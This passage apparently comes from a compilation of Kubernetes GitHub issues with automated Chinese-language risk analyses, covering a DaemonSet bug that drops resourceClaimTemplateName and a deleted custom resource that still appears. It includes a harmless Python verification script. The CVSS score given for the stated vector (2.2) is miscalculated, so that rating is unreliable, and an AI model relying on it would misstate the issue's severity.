ValueFrom:&EnvVarSource{FieldRef:&ObjectFieldSelector{APIVersion:v1,FieldPath:metadata.namespace,},ResourceFieldRef:nil,ConfigMapKeyRef:nil,SecretKeyRef:nil,}}] Resources:{Limits:map[] Requests:map[] Claims:[]} ResizePolicy:[] RestartPolicy:<nil> VolumeMounts:[{Name:kube-api-access-j7q2w ReadOnly:true RecursiveReadOnly:<nil> MountPath:/var/run/secrets/kubernetes.io/serviceaccount SubPath: MountPropagation:<nil> SubPathExpr:}] VolumeDevices:[] LivenessProbe:nil ReadinessProbe:&Probe{ProbeHandler:ProbeHandler{Exec:&ExecAction{Command:[sh -c ls /tmp/ready],},HTTPGet:nil,TCPSocket:nil,GRPC:nil,},InitialDelaySeconds:0,TimeoutSeconds:1,PeriodSeconds:10,SuccessThreshold:1,FailureThreshold:3,TerminationGracePeriodSeconds:nil,} StartupProbe:nil Lifecycle:nil TerminationMessagePath:/dev/termination-log TerminationMessagePolicy:File ImagePullPolicy:IfNotPresent SecurityContext:nil Stdin:false StdinOnce:false TTY:false}] EphemeralContainers:[] RestartPolicy:Always TerminationGracePeriodSeconds:0xc001ee22e0 ActiveDeadlineSeconds:<nil> DNSPolicy:ClusterFirst NodeSelector:map[] ServiceAccountName:default DeprecatedServiceAccount:default AutomountServiceAccountToken:<nil> NodeName: HostNetwork:false HostPID:false HostIPC:false ShareProcessNamespace:<nil> SecurityContext:&PodSecurityContext{SELinuxOptions:nil,RunAsUser:nil,RunAsNonRoot:nil,SupplementalGroups:[],FSGroup:nil,RunAsGroup:nil,Sysctls:[]Sysctl{},WindowsOptions:nil,FSGroupChangePolicy:nil,SeccompProfile:nil,AppArmorProfile:nil,SupplementalGroupsPolicy:nil,SELinuxChangePolicy:nil,} ImagePullSecrets:[] Hostname: Subdomain: Affinity:&Affinity{NodeAffinity:&NodeAffinity{RequiredDuringSchedulingIgnoredDuringExecution:&NodeSelector{NodeSelectorTerms:[]NodeSelectorTerm{NodeSelectorTerm{MatchExpressions:[]NodeSelectorRequirement{},MatchFields:[]NodeSelectorRequirement{NodeSelectorRequirement{Key:metadata.name,Operator:In,Values:[10-20-1-60],},},},},},PreferredDuringSchedulingIgnoredDuringExecution:[]PreferredSchedulingTerm{},},PodAffinity:nil,PodAntiAffinity:nil,} SchedulerName:default-scheduler Tolerations:[{Key:node.kubernetes.io/not-ready Operator:Exists Value: Effect:NoExecute TolerationSeconds:<nil>} {Key:node.kubernetes.io/unreachable Operator:Exists Value: Effect:NoExecute TolerationSeconds:<nil>} {Key:node.kubernetes.io/disk-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/memory-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/pid-pressure Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>} {Key:node.kubernetes.io/unschedulable Operator:Exists Value: Effect:NoSchedule TolerationSeconds:<nil>}] HostAliases:[] PriorityClassName: Priority:0xc001ee238c DNSConfig:nil ReadinessGates:[] RuntimeClassName:<nil> EnableServiceLinks:0xc001ee2390 PreemptionPolicy:0xc00038b270 Overhead:map[] TopologySpreadConstraints:[] SetHostnameAsFQDN:<nil> OS:nil HostUsers:<nil> SchedulingGates:[] ResourceClaims:[{Name:demo-static ResourceClaimName:<nil> ResourceClaimTemplateName:<nil>}] Resources:nil} Status:{Phase: Conditions:[] Message: Reason: NominatedNodeName: HostIP: HostIPs:[] PodIP: PodIPs:[] StartTime:<nil> InitContainerStatuses:[] ContainerStatuses:[] QOSClass: EphemeralContainerStatuses:[] Resize: ResourceClaimStatuses:[]}}","Pod":"demo-dra-"}
```

What happened here?

k8s version: 1.32.3

#### What did you expect to happen?

webhook can see the correct value for resourceClaimTemplate field.

#### How can we reproduce it (as minimally and precisely as possible)?

na

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.32.3
Kustomize Version: v5.5.0
Server Version: v1.32.3
```

</details>


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### 分析结果

**风险定级：**  
低风险

**判断依据：**  
1.  **问题描述:** 用户在启用了 `DynamicResourceAllocation` 特性门控的 Kubernetes 集群 (v1.32.3) 中创建了一个 DaemonSet。该 DaemonSet 的 Pod 模板 (`spec.template.spec`) 中定义了 `resourceClaims`，并指定了 `resourceClaimTemplateName` 字段。用户通过 `kubectl apply` 提交了该 DaemonSet，API Server 的响应中显示 `resourceClaimTemplateName` 字段被正确设置。然而，在后续处理流程中（具体表现为用户自定义的 PodMutating Webhook 接收到的 Pod 对象），该 Pod 对象 `spec.resourceClaims` 中的 `resourceClaimTemplateName` 字段变为了 `nil`。
2.  **核心问题:** `DaemonSet` 控制器根据模板创建 `Pod` 对象时，未能正确地将 `spec.template.spec.resourceClaims[*].resourceClaimTemplateName` 的值复制到 `Pod.spec.resourceClaims[*].resourceClaimTemplateName` 中。
3.  **潜在影响:** `DynamicResourceAllocation` (DRA) 功能依赖 `resourceClaimTemplateName` 来查找对应的 `ResourceClaimTemplate`，进而动态创建 `ResourceClaim` 对象，为 Pod 分配所需的动态资源。如果 Pod 规约中的 `resourceClaimTemplateName` 丢失（变为 nil），DRA 的调度和资源分配逻辑将无法正常工作，导致 Pod 可能因为无法获得所需资源而调度失败或运行异常。这构成了针对使用此功能的特定工作负载（该 DaemonSet 管理的 Pods）的**拒绝服务 (Denial of Service, DoS)**。
4.  **风险评估依据:**
    *   **攻击向量 (AV): Network** - 需要通过 Kubernetes API 提交资源。
    *   **攻击复杂度 (AC): Low** - 只需创建一个包含特定字段的 DaemonSet。
    *   **所需权限 (PR): High** - 创建或修改 DaemonSet 通常需要较高的权限（如 `apps/v1/daemonsets` 的 create/update 权限）。攻击者（提交 DaemonSet 的用户）是拥有这些权限的用户。
    *   **用户交互 (UI): None** - 无需用户交互。
    *   **范围 (S): Unchanged** - 影响局限于 Pod 的创建和资源分配，未改变控制平面或其他组件的范围。
    *   **机密性 (C): None** - 不涉及信息泄露。
    *   **完整性 (I): Low** - Pod 的规约被意外修改（字段丢失），影响了其定义的完整性，导致资源分配失败。
    *   **可用性 (A): Low** - 导致配置了 DRA 的特定 Pod 无法获取资源而失败，影响了该工作负载的可用性，但不是集群范围的 DoS。
    *   根据 CVSS 3.1 计算器 (AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:L/A:L)，评分为 2.2，属于 Low 级别。
    *   **符合标准 5:** 该问题导致的 DoS 需要攻击者（提交者）具备创建/修改 DaemonSet 的非只读权限，且影响的是其自身提交的工作负载的可用性。因此，不应判断为高风险。
    *   **符合标准 7 & 8:** 未涉及命令执行、提权、容器逃逸，也非低权限用户影响其他用户。
5.  **结论:** 该问题是一个功能性 Bug，导致配置错误，进而引发使用该功能的特定工作负载的 DoS。由于触发该问题需要较高的权限，并且影响范围局限于触发者自身的工作负载，根据提供的风险判断标准（特别是第 5 条），该问题不构成高风险安全漏洞。

**复现过程：**

```python
# 该问题被评定为低风险，根据要求，无需提供高风险问题的复现脚本。
# 如果需要验证该功能性问题，可以手动或使用如下概念性脚本（非用于安全攻击复现）：

import time
import yaml
from kubernetes import client, config
from kubernetes.client.rest import ApiException

# --- 配置 ---
NAMESPACE = "default"
DAEMONSET_NAME = "demo-dra-poc"
# 假设存在一个名为 demo-static 的 ResourceClaimTemplate
# 实际验证时需要先创建好对应的 ResourceClaimTemplate
# apiVersion: resource.k8s.io/v1alpha2
# kind: ResourceClaimTemplate
# metadata:
#   name: demo-static
# spec:
#   spec:
#     requests:
#     - name: gpu
#       resourceClassName: vendor.com/gpu

DAEMONSET_MANIFEST = f"""
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: {DAEMONSET_NAME}
  namespace: {NAMESPACE}
spec:
  selector:
    matchLabels:
      app: demo-dra-poc-app
  template:
    metadata:
      labels:
        app: demo-dra-poc-app
    spec:
      containers:
      - name: main-container
        image: busybox
        command: ["sleep", "3600"]
        resources: {{}} # 清空默认资源请求，避免干扰
      resourceClaims:
      - name: demo-claim # Claim 的名称
        resourceClaimTemplateName: demo-static # 引用的 Template 名称
"""

def verify_pod_resource_claim_template_name():
    """
    尝试创建 DaemonSet 并验证生成的 Pod 中 resourceClaimTemplateName 是否为 None
    """
    try:
        # 1. 加载 KubeConfig
        config.load_kube_config()
        apps_v1_api = client.AppsV1Api()
        core_v1_api = client.CoreV1Api()

        # 2. 清理可能存在的旧 DaemonSet
        try:
            apps_v1_api.delete_namespaced_daemon_set(DAEMONSET_NAME, NAMESPACE)
            print(f"Deleted existing DaemonSet '{DAEMONSET_NAME}'")
            time.sleep(5) # 等待删除完成
        except ApiException as e:
            if e.status != 404:
                print(f"Error deleting existing DaemonSet: {e}")
                # return

        # 3. 创建 DaemonSet
        daemonset_body = yaml.safe_load(DAEMONSET_MANIFEST)
        print(f"Creating DaemonSet '{DAEMONSET_NAME}'...")
        api_response = apps_v1_api.create_namespaced_daemon_set(
            body=daemonset_body,
            namespace=NAMESPACE
        )
        print(f"DaemonSet '{DAEMONSET_NAME}' created.")
        # print("API Response spec.template.spec.resourceClaims:")
        # print(api_response.spec.template.spec.resource_claims) # 确认提交时是存在的

        # 4. 等待 Pod 生成并检查
        print("Waiting for Pod managed by DaemonSet to be created...")
        label_selector = "app=demo-dra-poc-app"
        pod_found = False
        start_time = time.time()
        timeout = 120 # 2 分钟超时

        while time.time() - start_time < timeout:
            try:
                pods = core_v1_api.list_namespaced_pod(
                    namespace=NAMESPACE,
                    label_selector=label_selector
                )
                if pods.items:
                    pod = pods.items[0] # 取第一个找到的 Pod
                    pod_name = pod.metadata.name
                    print(f"Found Pod: {pod_name}")

                    # 检查 Pod spec 中的 resourceClaims
                    if pod.spec.resource_claims:
                        claim = pod.spec.resource_claims[0]
                        template_name = getattr(claim, 'resource_claim_template_name', 'AttributeNotPresent') # 使用getattr安全访问

                        print(f"Inspecting Pod '{pod_name}' spec.resourceClaims[0]:")
                        print(f"  Name: {claim.name}")
                        print(f"  ResourceClaimTemplateName: {template_name}")

                        if template_name is None:
                            print("\n[SUCCESS] Issue Reproduced: Pod.spec.resourceClaims[0].resourceClaimTemplateName is None.")
                        elif template_name == 'AttributeNotPresent':
                             print("\n[INFO] Pod.spec.resourceClaims[0].resourceClaimTemplateName attribute does not exist.")
                        else:
                            print(f"\n[FAILURE] Issue Not Reproduced: Pod.spec.resourceClaims[0].resourceClaimTemplateName has value: {template_name}.")
                        pod_found = True
                        break
                    else:
                        print(f"Pod '{pod_name}' found, but spec.resourceClaims is empty or None. Waiting...")

                else:
                    print("No pods found yet...")

            except ApiException as e:
                print(f"Error fetching pods: {e}")
            except Exception as e:
                print(f"An unexpected error occurred: {e}")

            time.sleep(5)

        if not pod_found and time.time() - start_time >= timeout:
            print("\n[TIMEOUT] Timed out waiting for Pod to be created or become inspectable.")
        elif not pod_found:
             print("\n[INFO] No Pod managed by the DaemonSet was found within the timeout.")


    except ApiException as e:
        print(f"Kubernetes API error: {e}")
    except Exception as e:
        print(f"An error occurred: {e}")
    finally:
        # 5. 清理 DaemonSet
        try:
            print(f"\nCleaning up DaemonSet '{DAEMONSET_NAME}'...")
            apps_v1_api.delete_namespaced_daemon_set(DAEMONSET_NAME, NAMESPACE)
            print(f"DaemonSet '{DAEMONSET_NAME}' deleted.")
        except NameError:
             print("Cleanup skipped: API client not initialized.") # 如果在 API client 初始化前出错
        except ApiException as e:
            if e.status == 404:
                 print(f"DaemonSet '{DAEMONSET_NAME}' already deleted or not found.")
            else:
                print(f"Error cleaning up DaemonSet: {e}")
        except Exception as e:
            print(f"An unexpected error occurred during cleanup: {e}")

# 直接执行主函数
verify_pod_resource_claim_template_name()
```


**解释说明：**

由于该 Issue 被评定为**低风险**，根据要求，我们不提供用于攻击复现的 POC 脚本。

上面提供了一个 Python 脚本，旨在**验证 Issue 中描述的功能性问题**，而非模拟安全攻击。该脚本执行以下操作：
1.  **连接集群:** 使用本地 `kubeconfig` 文件连接到 Kubernetes 集群。
2.  **定义 DaemonSet:** 定义一个简单的 DaemonSet manifest，其 Pod 模板中包含 `resourceClaims` 并指定了 `resourceClaimTemplateName`，模拟 Issue 中的场景。
3.  **清理与创建:** 尝试删除可能存在的同名旧 DaemonSet，然后创建新的 DaemonSet。
4.  **轮询检查 Pod:** 定时（每 5 秒）查询由该 DaemonSet 创建的 Pod。
5.  **验证字段:** 一旦找到 Pod，检查其 `spec.resource_claims` 字段。特别地，检查第一个 claim (`resource_claims[0]`) 的 `resource_claim_template_name` 属性。
6.  **报告结果:** 根据 `resource_claim_template_name` 的值（是 `None`、不存在，还是有预期之外的值）打印验证结果。如果该值为 `None`，则表明 Issue 中描述的现象得以复现。
7.  **超时机制:** 设置了 2 分钟的超时，如果在超时时间内未找到合适的 Pod 或未能完成检查，则报告超时。
8.  **清理资源:** 在脚本结束时（无论成功、失败或超时），尝试删除创建的 DaemonSet 以清理环境。

**重要提示:**
*   运行此脚本需要安装 `kubernetes` Python 库 (`pip install kubernetes`)。
*   运行此脚本需要具有在目标集群 `default` 命名空间中创建和删除 DaemonSet 以及列出 Pod 的权限。
*   此脚本假设 Kubernetes 集群已按 Issue 描述配置好（即启用了 `DynamicResourceAllocation` feature gate）。脚本本身**不会**修改集群的 feature gate 配置。
*   此脚本还假设集群中存在一个名为 `demo-static` 的 `ResourceClaimTemplate` 资源。如果不存在，Pod 可能因其他原因（无法找到模板）而失败，但这与本 Issue 关注的 `resourceClaimTemplateName` 字段是否丢失是不同的问题。为了纯粹验证字段丢失问题，模板是否存在可能不是严格必需的，但为了模拟完整场景，注释中提到了需要预先创建模板。
*   脚本的设计目的是在本地环境中验证该功能问题，而非进行安全渗透测试。

---


## Issue #131022 Get with resourceVersion on old CustomResource APIVersion shows deleted object.

- Issue 链接：[#131022](https://github.com/kubernetes/kubernetes/issues/131022)

### Issue 内容

#### What happened?

kube-apiserver still shows an CustomResource object which already got deleted.
But only if using the `resourceVersion` parameter and an old apiVersion of the Custom Resource.

Example `kubectl get` in the old and new api version does not show anything:
```sh
❯ kubectl get virtualmachines.v1alpha2.vmoperator.vmware.com -A
No resources found
❯ kubectl get virtualmachines.v1alpha4.vmoperator.vmware.com -A
No resources found
```

Emulating what a controller does (List and Watch with resourceVersion) for the current api version (v1alpha4) behaves as expected:

```sh
❯ kubectl get --raw '/apis/vmoperator.vmware.com/v1alpha4/virtualmachines'
{"apiVersion":"vmoperator.vmware.com/v1alpha4","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3565963"}}
❯ kubectl get --raw '/apis/vmoperator.vmware.com/v1alpha4/virtualmachines?resourceVersion=3565963'
{"apiVersion":"vmoperator.vmware.com/v1alpha4","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566130"}}
```

Doing the same but for v1alpha2 results in showing an object which got deleted before:
```sh
❯ k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines'
{"apiVersion":"vmoperator.vmware.com/v1alpha2","items":[],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566693"}}
❯ k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines?resourceVersion=3566693'
{"apiVersion":"vmoperator.vmware.com/v1alpha2","items":[{"apiVersion":"vmoperator.vmware.com/v1alpha2","kind":"VirtualMachine","metadata":{"annotations":{"virtualmachine.vmoperator.vmware.com/first-boot-done":"true","vmoperator.vmware.com/conversion":"{\"apiVersion\":\"vmoperator.vmware.com/v1alpha4\",\"kind\":\"VirtualMachine\",\"spec\":{\"biosUUID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"bootstrap\":{\"cloudInit\":{\"instanceID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"rawCloudConfig\":{\"key\":\"user-data\",\"name\":\"testcluster-mkstib-zjtvp-qmcjh\"}}},\"className\":\"best-effort-small\",\"image\":{\"kind\":\"ClusterVirtualMachineImage\",\"name\":\"vmi-86fe7a39856629414\"},\"imageName\":\"vmi-86fe7a39856629414\",\"instanceUUID\":\"d829bd73-7b48-460d-a57a-d1ba90307d63\",\"network\":{\"interfaces\":[{\"name\":\"eth0\",\"network\":{\"apiVersion\":\"netoperator.vmware.com/v1alpha1\",\"kind\":\"Network\",\"name\":\"primary\"}}]},\"powerOffMode\":\"Hard\",\"powerState\":\"PoweredOn\",\"readinessProbe\":{\"tcpSocket\":{\"port\":6443}},\"reserved\":{\"resourcePolicyName\":\"testcluster-mkstib\"},\"restartMode\":\"TrySoft\",\"storageClass\":\"storage-profile\",\"suspendMode\":\"TrySoft\"},\"status\":{\"biosUUID\":\"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d\",\"changeBlockTracking\":false,\"class\":{\"apiVersion\":\"vmoperator.vmware.com/v1alpha4\",\"kind\":\"VirtualMachineClass\",\"name\":\"best-effort-small\"},\"conditions\":[{\"lastTransitionTime\":\"2025-03-20T20:45:32Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"Ready\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"NoBootstrapStatus\",\"status\":\"Unknown\",\"type\":\"GuestBootstrap\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"GuestCustomization\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineBootstrapReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineClassConfigurationSynced\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineClassReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:31Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineConditionPlacementReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineConditionVMSetResourcePolicyReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineCreated\"},{\"lastTransitionTime\":\"2025-03-20T11:35:39Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineImageReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:31Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineNetworkReady\"},{\"lastTransitionTime\":\"2025-03-20T20:41:51Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineReconcileReady\"},{\"lastTransitionTime\":\"2025-03-20T20:40:30Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineStorageReady\"},{\"lastTransitionTime\":\"2025-03-20T20:42:14Z\",\"message\":\"\",\"reason\":\"True\",\"status\":\"True\",\"type\":\"VirtualMachineTools\"}],\"hardwareVersion\":22,\"host\":\"10.160.248.110\",\"instanceUUID\":\"d829bd73-7b48-460d-a57a-d1ba90307d63\",\"network\":{\"config\":{\"dns\":{\"hostName\":\"testcluster-mkstib-zjtvp-qmcjh\",\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"]},\"interfaces\":[{\"dns\":{\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"]},\"ip\":{\"addresses\":[\"X.X.X.53/16\"],\"gateway4\":\"192.168.1.1\"},\"name\":\"eth0\"}]},\"interfaces\":[{\"deviceKey\":4000,\"ip\":{\"addresses\":[{\"address\":\"X.X.X.53\",\"lifetime\":null,\"state\":\"preferred\"},{\"address\":\"fe80::250:56ff:febe:e882\",\"lifetime\":null,\"state\":\"unknown\"}],\"macAddr\":\"00:50:56:be:e8:82\"},\"name\":\"eth0\"}],\"ipStacks\":[{\"dns\":{\"domainName\":\".\",\"hostName\":\"testcluster-mkstib-zjtvp-qmcjh\",\"nameservers\":[\"Y.Y.Y.10\",\"Y.Y.Y.20\"],\"searchDomains\":[\".\"]},\"ipRoutes\":[{\"gateway\":{\"address\":\"192.168.1.1\",\"device\":\"0\"},\"networkAddress\":\"0.0.0.0/0\"},{\"gateway\":{\"device\":\"0\"},\"networkAddress\":\"192.168.0.0/16\"}]}],\"primaryIP4\":\"X.X.X.53\"},\"powerState\":\"PoweredOn\",\"storage\":{\"usage\":{\"disks\":\"7Gi\",\"other\":\"4Gi\",\"total\":\"11Gi\"}},\"uniqueID\":\"vm-258\",\"volumes\":[{\"attached\":true,\"diskUUID\":\"6000C294-9a81-cc92-cc63-a48796db9ffa\",\"limit\":\"20Gi\",\"name\":\"testcluster-mkstib-zjtvp-qmcjh\",\"type\":\"Classic\",\"used\":\"7Gi\"}],\"zone\":\"domain-c54\"}}","vmoperator.vmware.com/created-at-build-version":"0.1.0+5e47405+1.8.6+6b764225+84090880","vmoperator.vmware.com/created-at-schema-version":"v1alpha4","vmoperator.vmware.com/last-resized-vm-class":"{\"name\":\"best-effort-small\",\"uid\":\"23fa178a-e581-4114-8171-aab2e9ab95c3\",\"generation\":1}","vmoperator.vmware.com/manager-id":"30ac0023-23d4-4a84-9ec3-a30560c7a375","vsphere-cluster-module-group":"control-plane-group","vsphere-tag":"CtrlVmVmAATag"},"creationTimestamp":"2025-03-20T20:40:30Z","deletionGracePeriodSeconds":0,"deletionTimestamp":"2025-03-20T20:57:24Z","finalizers":["vmoperator.vmware.com/virtualmachine"],"generation":2,"labels":{"capv.vmware.com/cluster.name":"testcluster-mkstib","capv.vmware.com/cluster.role":"controlplane","capw.vmware.com/cluster.name":"testcluster-mkstib","capw.vmware.com/cluster.role":"controlplane","cluster.x-k8s.io/cluster-name":"testcluster-mkstib","topology.kubernetes.io/zone":"domain-c54"},"managedFields":[{"apiVersion":"vmoperator.vmware.com/v1alpha2","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{".":{},"f:vsphere-cluster-module-group":{},"f:vsphere-tag":{}},"f:labels":{".":{},"f:capv.vmware.com/cluster.name":{},"f:capv.vmware.com/cluster.role":{},"f:capw.vmware.com/cluster.name":{},"f:capw.vmware.com/cluster.role":{},"f:cluster.x-k8s.io/cluster-name":{},"f:topology.kubernetes.io/zone":{}},"f:ownerReferences":{".":{},"k:{\"uid\":\"e7e468b1-6d87-4864-9121-d008ef5a351e\"}":{}}},"f:spec":{".":{},"f:bootstrap":{".":{},"f:cloudInit":{".":{},"f:rawCloudConfig":{".":{},"f:key":{},"f:name":{}}}},"f:className":{},"f:imageName":{},"f:network":{".":{},"f:interfaces":{".":{},"k:{\"name\":\"eth0\"}":{".":{},"f:name":{},"f:network":{".":{},"f:apiVersion":{},"f:kind":{},"f:name":{}}}}},"f:powerOffMode":{},"f:powerState":{},"f:readinessProbe":{".":{},"f:tcpSocket":{".":{},"f:port":{}}},"f:reserved":{".":{},"f:resourcePolicyName":{}},"f:restartMode":{},"f:storageClass":{},"f:suspendMode":{}}},"manager":"manager","operation":"Update","time":"2025-03-20T20:40:30Z"},{"apiVersion":"vmoperator.vmware.com/v1alpha4","fieldsType":"FieldsV1","fieldsV1":{"f:metadata":{"f:annotations":{"f:virtualmachine.vmoperator.vmware.com/first-boot-done":{},"f:vmoperator.vmware.com/last-resized-vm-class":{},"f:vmoperator.vmware.com/manager-id":{}},"f:finalizers":{".":{},"v:\"vmoperator.vmware.com/virtualmachine\"":{}}}},"manager":"manager","operation":"Update","time":"2025-03-20T20:41:51Z"},{"apiVersion":"vmoperator.vmware.com/v1alpha4","fieldsType":"FieldsV1","fieldsV1":{"f:status":{"f:biosUUID":{},"f:changeBlockTracking":{},"f:class":{".":{},"f:apiVersion":{},"f:kind":{},"f:name":{}},"f:conditions":{},"f:hardwareVersion":{},"f:host":{},"f:instanceUUID":{},"f:network":{".":{},"f:config":{".":{},"f:dns":{".":{},"f:hostName":{},"f:nameservers":{}},"f:interfaces":{}},"f:interfaces":{},"f:ipStacks":{},"f:primaryIP4":{}},"f:powerState":{},"f:storage":{".":{},"f:usage":{".":{},"f:disks":{},"f:other":{},"f:total":{}}},"f:uniqueID":{},"f:volumes":{".":{},"k:{\"name\":\"testcluster-mkstib-zjtvp-qmcjh\",\"type\":\"Classic\"}":{".":{},"f:attached":{},"f:diskUUID":{},"f:limit":{},"f:name":{},"f:type":{},"f:used":{}}},"f:zone":{}}},"manager":"manager","operation":"Update","subresource":"status","time":"2025-03-20T20:45:33Z"}],"name":"testcluster-mkstib-zjtvp-qmcjh","namespace":"utkg-update-mkstib","ownerReferences":[{"apiVersion":"vmware.infrastructure.cluster.x-k8s.io/v1beta1","blockOwnerDeletion":true,"controller":true,"kind":"VSphereMachine","name":"testcluster-mkstib-zjtvp-qmcjh","uid":"e7e468b1-6d87-4864-9121-d008ef5a351e"}],"resourceVersion":"379688","uid":"f4ef3b9b-e432-41fb-92ef-45c3c4033bf3"},"spec":{"bootstrap":{"cloudInit":{"rawCloudConfig":{"key":"user-data","name":"testcluster-mkstib-zjtvp-qmcjh"}}},"className":"best-effort-small","imageName":"vmi-86fe7a39856629414","network":{"interfaces":[{"name":"eth0","network":{"apiVersion":"netoperator.vmware.com/v1alpha1","kind":"Network","name":"primary"}}]},"powerOffMode":"Hard","powerState":"PoweredOn","readinessProbe":{"tcpSocket":{"port":6443}},"reserved":{"resourcePolicyName":"testcluster-mkstib"},"restartMode":"TrySoft","storageClass":"wcpglobal-storage-profile","suspendMode":"TrySoft"},"status":{"biosUUID":"4b5ce20c-f3a8-42e7-8a1b-41c08b4a4a0d","changeBlockTracking":false,"class":{"apiVersion":"vmoperator.vmware.com/v1alpha4","kind":"VirtualMachineClass","name":"best-effort-small"},"conditions":[{"lastTransitionTime":"2025-03-20T20:45:32Z","message":"","reason":"True","status":"True","type":"Ready"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"NoBootstrapStatus","status":"Unknown","type":"GuestBootstrap"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"GuestCustomization"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineBootstrapReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineClassConfigurationSynced"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineClassReady"},{"lastTransitionTime":"2025-03-20T20:40:31Z","message":"","reason":"True","status":"True","type":"VirtualMachineConditionPlacementReady"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineConditionVMSetResourcePolicyReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineCreated"},{"lastTransitionTime":"2025-03-20T11:35:39Z","message":"","reason":"True","status":"True","type":"VirtualMachineImageReady"},{"lastTransitionTime":"2025-03-20T20:40:31Z","message":"","reason":"True","status":"True","type":"VirtualMachineNetworkReady"},{"lastTransitionTime":"2025-03-20T20:41:51Z","message":"","reason":"True","status":"True","type":"VirtualMachineReconcileReady"},{"lastTransitionTime":"2025-03-20T20:40:30Z","message":"","reason":"True","status":"True","type":"VirtualMachineStorageReady"},{"lastTransitionTime":"2025-03-20T20:42:14Z","message":"","reason":"True","status":"True","type":"VirtualMachineTools"}],"hardwareVersion":22,"host":"10.160.248.110","image":{"apiVersion":"vmoperator.vmware.com/v1alpha4","kind":"ClusterVirtualMachineImage","name":"vmi-86fe7a39856629414"},"instanceUUID":"d829bd73-7b48-460d-a57a-d1ba90307d63","network":{"config":{"dns":{"hostName":"testcluster-mkstib-zjtvp-qmcjh","nameservers":["Y.Y.Y.10","Y.Y.Y.20"]},"interfaces":[{"dns":{"nameservers":["Y.Y.Y.10","Y.Y.Y.20"]},"ip":{"addresses":["X.X.X.53/16"],"gateway4":"192.168.1.1"},"name":"eth0"}]},"interfaces":[{"deviceKey":4000,"ip":{"addresses":[{"address":"X.X.X.53","state":"preferred"},{"address":"fe80::250:56ff:febe:e882","state":"unknown"}],"macAddr":"00:50:56:be:e8:82"},"name":"eth0"}],"ipStacks":[{"dns":{"domainName":"testcluster-mkstib-zjtvp-qmcjh","hostName":".","nameservers":["Y.Y.Y.10","Y.Y.Y.20"],"searchDomains":["."]},"ipRoutes":[{"gateway":{"address":"192.168.1.1","device":"0"},"networkAddress":"0.0.0.0/0"},{"gateway":{"device":"0"},"networkAddress":"192.168.0.0/16"}]}],"primaryIP4":"X.X.X.53"},"powerState":"PoweredOn","uniqueID":"vm-258","zone":"domain-c54"}}],"kind":"VirtualMachineList","metadata":{"continue":"","resourceVersion":"3566778"}}
```



#### What did you expect to happen?

The following command from the above example should not show an item.

```sh
k get --raw '/apis/vmoperator.vmware.com/v1alpha2/virtualmachines?resourceVersion=3566693'
```


#### How can we reproduce it (as minimally and precisely as possible)?

Not sure how to reproduce this.

#### Anything else we need to know?

The issue is problematic for our controller, which waits until the object is not there anymore (get returns the NotFound error).

The issue does not auto-resolve itself, even after multiple days (occurred on friday, does still exist today, monday).

